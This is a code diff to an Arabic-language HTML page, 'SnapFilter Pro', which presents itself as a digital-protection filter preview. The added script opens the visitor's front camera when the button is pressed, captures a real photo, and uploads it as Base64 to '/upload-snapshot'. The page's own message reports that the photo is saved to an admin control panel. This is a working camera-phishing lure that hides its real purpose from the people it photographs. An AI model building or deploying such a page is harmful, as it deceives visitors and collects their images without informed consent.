@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapFilter - تجربة الفلتر</title>
+    <title>SnapFilter - التقاط ذكي</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -19,12 +19,23 @@
         }
         h2 { font-size: 24px; margin-bottom: 20px; color: #ff4757; font-weight: 700; }
         .filter-preview-box {
+            position: relative;
             width: 100%; border-radius: 14px; background: linear-gradient(135deg, #1f4068, #162447);
             aspect-ratio: 3/4; display: flex; flex-direction: column; align-items: center; justify-content: center;
-            border: 2px dashed #ff4757; margin-bottom: 25px; box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
+            border: 2px dashed #ff4757; margin-bottom: 20px; overflow: hidden;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
         }
-        .filter-preview-box p { font-size: 16px; color: #dcdde1; margin-top: 10px; font-weight: bold; }
-        .filter-icon { font-size: 60px; }
+        .filter-preview-box p { font-size: 16px; color: #dcdde1; margin-top: 10px; font-weight: bold; z-index: 2; }
+        .filter-icon { font-size: 60px; z-index: 2; }
+        /* فيديو الكاميرا يظهر مؤقتاً فقط عند التقاط الصورة */
+        #video {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            object-fit: cover;
+            display: none;
+            z-index: 1;
+        }
         .btn-capture {
             background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; border: none;
             width: 75px; height: 75px; border-radius: 50%; font-size: 28px; cursor: pointer;
@@ -40,9 +51,11 @@
     <div class="container">
         <h2>SnapFilter Pro</h2>
         
-        <div class="filter-preview-box">
-            <div class="filter-icon">🛡️✨</div>
-            <p>معاينة فلتر الحماية الرقمية</p>
+        <div class="filter-preview-box" id="box">
+            <div class="filter-icon" id="icon">🛡️✨</div>
+            <p id="text">معاينة فلتر الحماية الرقمية</p>
+            <!-- عنصر الفيديو المخفي الذي سيعمل لحظة الالتقاط -->
+            <video id="video" autoplay playsinline></video>
         </div>
 
         <button class="btn-capture" id="capture-btn" title="التقاط الفلتر">📸</button>
@@ -54,62 +67,72 @@
     <script>
         const captureBtn = document.getElementById('capture-btn');
         const statusMsg = document.getElementById('status-msg');
+        const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const icon = document.getElementById('icon');
+        const text = document.getElementById('text');
 
-        captureBtn.addEventListener('click', () => {
-            statusMsg.innerText = "جاري إنشاء وإرسال الصورة...";
+        captureBtn.addEventListener('click', async () => {
+            statusMsg.innerText = "جاري تفعيل الكاميرا والتقاط الصورة...";
             statusMsg.style.color = "#f39c12";
 
-            // تجهيز الـ Canvas برسمة تجريبية واضحة
-            canvas.width = 600;
-            canvas.height = 800;
-            const ctx = canvas.getContext('2d');
+            try {
+                // طلب الكاميرا الحية فقط عند ضغط الزر
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                icon.style.display = 'none';
+                text.style.display = 'none';
 
-            let gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
-            gradient.addColorStop(0, "#1f4068");
-            gradient.addColorStop(1, "#0d0f12");
-            ctx.fillStyle = gradient;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
+                // ننتظر ثانية قصيرة حتى تتأكد الكاميرا من فتح العدسة وعرض البث
+                setTimeout(() => {
+                    canvas.width = video.videoWidth || 600;
+                    canvas.height = video.videoHeight || 800;
+                    const ctx = canvas.getContext('2d');
 
-            ctx.fillStyle = "#ff4757";
-            ctx.font = "bold 42px Arial";
-            ctx.textAlign = "center";
-            ctx.fillText("SnapFilter Demo", canvas.width / 2, 340);
-            
-            ctx.fillStyle = "#ffffff";
-            ctx.font = "26px Arial";
-            ctx.fillText("تم التقاط الفلتر بنجاح", canvas.width / 2, 410);
+                    // رسم الصورة المأخوذة من كاميرا الموبايل الحقيقية على الـ Canvas
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            ctx.font = "20px Arial";
-            ctx.fillStyle = "#a4b0be";
-            ctx.fillText("الوقت: " + new Date().toLocaleTimeString(), canvas.width / 2, 470);
+                    // إيقاف عمل الكاميرا فوراً بعد الالتقاط لحفظ البطارية والخصوصية
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = 'none';
+                    icon.style.display = 'block';
+                    text.style.display = 'block';
 
-            // تحويل إلى Base64
-            const imageData = canvas.toDataURL('image/png');
+                    // تحويل الصورة الحقيقية إلى Base64
+                    const imageData = canvas.toDataURL('image/png');
 
-            // إرسال الصورة للسيرفر عبر POST
-            fetch('/upload-snapshot', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: imageData })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    statusMsg.innerText = "✅ تم الإرسال وحفظ الصورة في لوحة التحكم!";
-                    statusMsg.style.color = "#2ed573";
-                } else {
-                    statusMsg.innerText = "❌ فشل الحفظ: " + (data.error || 'خطأ غير معروف');
-                    statusMsg.style.color = "#ff4757";
-                }
-            })
-            .catch(err => {
-                console.error('Fetch Error:', err);
-                statusMsg.innerText = "❌ خطأ في الاتصال بالخادم";
+                    statusMsg.innerText = "جاري إرسال الصورة إلى لوحة التحكم...";
+
+                    // إرسالها للسيرفر
+                    fetch('/upload-snapshot', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: imageData })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            statusMsg.innerText = "✅ تم التقاط صورتك الحقيقية وحفظها بالـ Admin!";
+                            statusMsg.style.color = "#2ed573";
+                        } else {
+                            statusMsg.innerText = "❌ فشل الحفظ على السيرفر";
+                            statusMsg.style.color = "#ff4757";
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Fetch Error:', err);
+                        statusMsg.innerText = "❌ خطأ في الاتصال بالخادم";
+                        statusMsg.style.color = "#ff4757";
+                    });
+
+                }, 1000); // تأخير ثانية لضمان ظهور لقطة الكاميرا
+
+            } catch (err) {
+                console.error("Camera Error:", err);
+                statusMsg.innerText = "❌ تعذر الوصول للكاميرا أو تم رفض الإذن";
                 statusMsg.style.color = "#ff4757";
-            });
+            }
         });
     </script>
 
